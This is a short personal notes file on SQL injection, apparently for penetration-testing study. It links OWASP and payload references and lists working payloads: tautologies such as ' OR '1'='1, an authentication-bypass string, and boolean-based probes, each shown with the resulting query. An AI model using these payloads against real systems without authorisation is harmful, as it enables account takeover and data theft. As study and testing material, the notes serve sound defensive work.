---
id: SQL-injection
aliases:
  - SQLi
tags:
  - Networking/Services/SQL
links: "[[SQL]]"
---

# SQL injection

## Resourcers

- [OWASP - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [TCM Security - Avoid OR 1=1](https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/)
- [GitHub - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-remote-code-execution)

## DO NOT USE

```sql
# OR <true>
OR 1=1
' OR '1'='1
```

## Payloads

<!-- Payloads {{{-->
<details>
  <summary><b>Authentication bypass</b></summary>

```sql
admin'; -- -
```
```sql
SELECT * FROM users WHERE username = 'admin'; -- -' AND password = 'password'
```

</details>

___
<!-- }}} -->

<!-- Boolean {{{-->
<details>
  <summary><b>Boolean</b></summary>

```sql
admin' AND '1'='1 / ' AND '1'='2
```
```sql
SELECT * FROM articles WHERE author = 'admin' AND '1'='1'
```

</details>

___
<!-- }}} -->
